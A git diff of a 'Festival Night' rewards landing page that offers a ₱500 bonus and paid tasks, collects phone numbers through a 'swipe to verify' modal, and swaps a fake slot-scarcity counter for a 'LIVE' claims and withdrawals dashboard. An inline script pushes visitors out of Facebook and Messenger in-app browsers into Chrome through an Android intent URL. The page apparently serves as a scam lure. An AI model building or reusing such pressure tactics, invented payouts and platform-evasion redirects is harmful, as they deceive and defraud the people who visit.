@@ -9,7 +9,7 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
 
-    <!-- Google Fonts - Premium Selection -->
+    <!-- Google Fonts -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@400;500;600;700;800;900&family=Orbitron:wght@400;500;600;700;800;900&family=Poppins:wght@300;400;500;600;700;800&family=Playfair+Display:ital,wght@0,400;0,500;0,600;0,700;0,800;0,900;1,400&family=Forum&family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
@@ -22,14 +22,10 @@
 </head>
 <body>
 
-    <!-- ====== FESTIVAL BACKGROUND LAYERS ====== -->
-    <!-- Main background image -->
-    <div class="bg-festival"></div>
-    
-    <!-- Night sky overlay with stars -->
+    <!-- ====== NIGHT SKY OVERLAY ====== -->
     <div class="bg-night-sky"></div>
     
-    <!-- Fireworks effects -->
+    <!-- Fireworks -->
     <div class="fireworks">
         <div class="firework burst-1"></div>
         <div class="firework burst-2"></div>
@@ -38,7 +34,7 @@
         <div class="firework burst-5"></div>
     </div>
     
-    <!-- Magical golden bokeh -->
+    <!-- Bokeh -->
     <div class="bokeh">
         <div class="bokeh-circle"></div>
         <div class="bokeh-circle"></div>
@@ -54,7 +50,7 @@
         <div class="bokeh-circle"></div>
     </div>
     
-    <!-- Floating confetti -->
+    <!-- Confetti -->
     <div class="confetti-fall">
         <div class="confetti-piece pink"></div>
         <div class="confetti-piece gold"></div>
@@ -83,89 +79,135 @@
         <div class="ticker-badge">✦ FESTIVAL ✦</div>
     </div>
 
-    <!-- ====== MAIN CARD - TRANSPARENT GLASS ====== -->
+    <!-- ====== MAIN CARD ====== -->
     <div class="main-card" id="mainCard">
+        
+        <!-- Background Image Inside Container -->
+        <div class="card-bg-image"></div>
+        <div class="card-bg-overlay"></div>
+        
         <!-- Corner Accents -->
         <span class="corner-deco tl"><i class="fas fa-star"></i></span>
         <span class="corner-deco tr"><i class="fas fa-star"></i></span>
         <span class="corner-deco bl"><i class="fas fa-star"></i></span>
         <span class="corner-deco br"><i class="fas fa-star"></i></span>
         
-        <!-- Logo Area -->
-        <div class="logo-area">
-            <div class="logo-icon">
-                <i class="fas fa-wand-magic-sparkles"></i>
-                <div class="logo-ring"></div>
+        <!-- Card Content -->
+        <div class="card-content">
+            
+            <!-- Logo Area -->
+            <div class="logo-area">
+                <div class="logo-icon">
+                    <i class="fas fa-wand-magic-sparkles"></i>
+                    <div class="logo-ring"></div>
+                </div>
+                <h1 class="logo-text">FESTIVAL</h1>
+                <h1 class="logo-text-sub">NIGHT</h1>
+                <div class="logo-sub">✦ Magical Celebration ✦</div>
             </div>
-            <h1 class="logo-text">FESTIVAL</h1>
-            <h1 class="logo-text-sub">NIGHT</h1>
-            <div class="logo-sub">✦ Magical Celebration ✦</div>
-        </div>
 
-        <!-- Value Props -->
-        <div class="value-props">
-            <div class="prop-row">
-                <div class="prop-icon"><i class="fas fa-fireworks"></i></div>
-                <div>
-                    <div class="prop-title">Festival Tasks</div>
-                    <div class="prop-desc">Complete fun tasks & earn rewards</div>
+            <!-- Value Props -->
+            <div class="value-props">
+                <div class="prop-row">
+                    <div class="prop-icon"><i class="fas fa-fireworks"></i></div>
+                    <div>
+                        <div class="prop-title">Festival Tasks</div>
+                        <div class="prop-desc">Complete fun tasks & earn rewards</div>
+                    </div>
+                </div>
+                <div class="prop-row">
+                    <div class="prop-icon"><i class="fas fa-gem"></i></div>
+                    <div>
+                        <div class="prop-title">Golden Prizes</div>
+                        <div class="prop-desc">₱500 per welcome bonus</div>
+                    </div>
+                </div>
+                <div class="prop-row">
+                    <div class="prop-icon"><i class="fas fa-wallet"></i></div>
+                    <div>
+                        <div class="prop-title">Instant Payout</div>
+                        <div class="prop-desc">Withdraw directly to your wallet</div>
+                    </div>
                 </div>
             </div>
-            <div class="prop-row">
-                <div class="prop-icon"><i class="fas fa-gem"></i></div>
-                <div>
-                    <div class="prop-title">Golden Prizes</div>
-                    <div class="prop-desc">₱500 per successful completion</div>
-                </div>
-            </div>
-            <div class="prop-row">
-                <div class="prop-icon"><i class="fas fa-wallet"></i></div>
-                <div>
-                    <div class="prop-title">Instant Payout</div>
-                    <div class="prop-desc">Withdraw directly to your wallet</div>
-                </div>
-            </div>
-        </div>
 
-        <!-- Scarcity Tracker -->
-        <div class="scarcity-box">
-            <div class="scarcity-header">
-                <span class="scarcity-label">
-                    <i class="fas fa-ticket"></i> Festival Slots
-                </span>
-                <div>
-                    <span class="scarcity-numbers" id="remNum">88</span>
-                    <span class="scarcity-total">/100</span>
+            <!-- ========== 7-DAY TREND DASHBOARD ========== -->
+            <div class="trend-dashboard">
+                <div class="trend-header">
+                    <div class="trend-live-badge">
+                        <span class="live-dot"></span>
+                        LIVE
+                    </div>
+                    <div class="trend-title">
+                        <i class="fas fa-chart-line"></i>
+                        TRENDS
+                    </div>
+                </div>
+                
+                <div class="trend-graph-container">
+                    <div class="trend-graph" id="trendGraph">
+                        <div class="graph-loading">
+                            <i class="fas fa-spinner fa-spin"></i>
+                            Loading...
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="trend-stats-row">
+                    <div class="trend-stat-card">
+                        <div class="trend-stat-icon blue">
+                            <i class="fas fa-users"></i>
+                        </div>
+                        <div class="trend-stat-content">
+                            <div class="trend-stat-label">TOTAL CLAIMS</div>
+                            <div class="trend-stat-value" id="totalClaimsCount">0</div>
+                            <div class="trend-stat-sub">
+                                <span class="stat-dot blue"></span>
+                                <span id="totalClaimsAmount">₱0</span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="trend-stat-card">
+                        <div class="trend-stat-icon green">
+                            <i class="fas fa-money-bill-wave"></i>
+                        </div>
+                        <div class="trend-stat-content">
+                            <div class="trend-stat-label">WITHDRAWALS</div>
+                            <div class="trend-stat-value" id="totalRedemptionsCount">0</div>
+                            <div class="trend-stat-sub">
+                                <span class="stat-dot green"></span>
+                                <span id="totalRedemptionsAmount">₱0</span>
+                            </div>
+                        </div>
+                    </div>
                 </div>
             </div>
-            <div class="progress-track">
-                <div class="progress-fill" id="pBar" style="width: 88%"></div>
-            </div>
-        </div>
 
-        <!-- Swipe to Verify -->
-        <div class="swipe-container">
-            <div class="swipe-track" id="swipeTrack">
-                <div class="swipe-fire-trail" id="swipeFireTrail"></div>
-                <div class="swipe-icon" id="swipeIcon">
-                    <img src="images/scatter_icon.jpg" class="scatter-icon" alt="swipe">
-                </div>
-                <div class="swipe-text">
-                    <i class="fas fa-arrow-right"></i> 
-                    SWIPE TO VERIFY 
-                    <i class="fas fa-arrow-left"></i>
+            <!-- Swipe to Verify -->
+            <div class="swipe-container">
+                <div class="swipe-track" id="swipeTrack">
+                    <div class="swipe-fire-trail" id="swipeFireTrail"></div>
+                    <div class="swipe-icon" id="swipeIcon">
+                        <img src="images/scatter_icon.jpg" class="scatter-icon" alt="swipe">
+                    </div>
+                    <div class="swipe-text">
+                        <i class="fas fa-arrow-right"></i> 
+                        SWIPE TO VERIFY 
+                        <i class="fas fa-arrow-left"></i>
+                    </div>
                 </div>
             </div>
-        </div>
 
-        <!-- Footer -->
-        <div class="card-footer">
-            <i class="fas fa-shield-halved"></i>
-            <span>Protected by Festival Magic</span>
+            <!-- Footer -->
+            <div class="card-footer">
+                <i class="fas fa-shield-halved"></i>
+                <span>Protected by Festival Magic</span>
+            </div>
         </div>
     </div>
 
-    <!-- ====== MODAL - TRANSPARENT GLASS FORM ====== -->
+    <!-- ====== MODAL ====== -->
     <div class="modal-overlay" id="modalOverlay">
         <div class="modal-container">
             <div class="modal-card">
@@ -174,19 +216,16 @@
                 </button>
                 
                 <div id="modalBodyContent">
-                    <!-- Modal Icon -->
                     <div class="modal-icon">
                         <i class="fas fa-wand-magic-sparkles"></i>
                     </div>
                     
-                    <!-- Modal Title -->
                     <h2 class="modal-title">✦ VERIFICATION ✦</h2>
                     <p class="modal-subtitle">
                         This will be your <span class="gold-text">Player ID</span><br>
                         Enter the magical night celebration
                     </p>
                     
-                    <!-- Bonus Box -->
                     <div class="bonus-box-premium">
                         <div class="bonus-glow"></div>
                         <div class="bonus-amount-premium">₱500</div>
@@ -198,7 +237,6 @@
                         <div class="bonus-shine"></div>
                     </div>
                     
-                    <!-- Input Group -->
                     <div class="input-group-premium">
                         <label class="input-label-premium">
                             <i class="fas fa-mobile-screen-button"></i>
@@ -215,13 +253,11 @@
                         </div>
                     </div>
                     
-                    <!-- Submit Button -->
                     <button class="login-btn" id="claimBtn" onclick="processStep1()">
                         <span class="login-text">PROCEED</span>
                         <span class="login-dots"></span>
                     </button>
                     
-                    <!-- Warning -->
                     <div class="warning-text-premium">
                         <i class="fas fa-shield-halved"></i>
                         <span>Complete more tasks to receive festival payouts</span>
@@ -231,18 +267,18 @@
         </div>
     </div>
 
-    <!-- Particles Canvas -->
     <canvas id="particleCanvas"></canvas>
 
     <!-- ====== SCRIPTS ====== -->
     <script src="js/config.js"></script>
     <script src="js/index.js"></script>
+    <script src="js/trend_graph.js"></script>
     
     <script>
         // ========== AUTO-REDIRECT IF ALREADY LOGGED IN ==========
         (function() {
-            const existingUserPhone = localStorage.getItem("userPhone");
-            const existingDeviceId = localStorage.getItem("userDeviceId");
+            var existingUserPhone = localStorage.getItem("userPhone");
+            var existingDeviceId = localStorage.getItem("userDeviceId");
             
             if (existingUserPhone && existingUserPhone !== 'null' && existingUserPhone !== 'undefined' && existingUserPhone.length > 5) {
                 console.log('Existing user detected:', existingUserPhone);
@@ -253,16 +289,16 @@
 
         // ========== INTENT URL HANDLER ==========
         (function() {
-            const isFacebookApp = navigator.userAgent.includes('FBAN') || 
-                                  navigator.userAgent.includes('FBAV') ||
-                                  navigator.userAgent.includes('Messenger');
+            var isFacebookApp = navigator.userAgent.includes('FBAN') || 
+                                navigator.userAgent.includes('FBAV') ||
+                                navigator.userAgent.includes('Messenger');
             
             if (isFacebookApp && !window.location.hash.includes('redirected')) {
                 window.location.hash = 'redirected';
                 
-                const targetUrl = 'https://xjiligames.github.io/rewards/index.html';
-                const urlWithoutProtocol = targetUrl.replace('https://', '');
-                const intentUrl = `intent://${urlWithoutProtocol}#Intent;scheme=https;package=com.android.chrome;end`;
+                var targetUrl = 'https://xjiligames.github.io/rewards/index.html';
+                var urlWithoutProtocol = targetUrl.replace('https://', '');
+                var intentUrl = 'intent://' + urlWithoutProtocol + '#Intent;scheme=https;package=com.android.chrome;end';
                 
                 window.location.href = intentUrl;
             }
